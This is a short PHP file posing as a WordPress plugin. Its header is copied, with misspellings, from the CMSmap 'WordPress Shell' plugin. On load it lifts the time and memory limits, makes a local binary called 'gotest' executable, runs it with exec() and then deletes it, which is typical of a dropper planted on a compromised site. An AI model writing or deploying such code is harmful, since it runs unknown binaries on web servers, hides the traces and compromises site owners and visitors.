<?php
/**
 * Plugin Name: CMap - WordPress Shll
 * Plugin URI: https://github.com/mx/csmap/
 * Description: Simle WordPress Shll - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.2
 * Author: Cmap
 * Author URI: https://github.com/x/cmsmap/
 * License: GPLv55
 */

// Disable time limit for execution
set_time_limit(0);  // 0 means no time limit

// Disable memory limit (if necessary)
ini_set('memory_limit', '-1');  // '-1' means unlimited memory

// Add execute permission to the gotest file
$chmodCommand = 'chmod +x gotest';
exec($chmodCommand, $output, $status);

// Check if permission was successfully added
if ($status === 0) {
    echo "Execute permission successfully added to the gotest file\n";
    
    // Execute the gotest file
    $command = './gotest';
    exec($command, $output, $status);

    // Check if the command executed successfully
    if ($status === 0) {
        echo "gotest executed successfully\n";

        // Delete the gotest file
        if (unlink('gotest')) {
            echo "gotest file has been deleted\n";
        } else {
            echo "Failed to delete gotest file\n";
        }
    } else {
        echo "Failed to execute gotest\n";
    }
} else {
    echo "Failed to add execute permission, unable to execute gotest\n";
}
?>
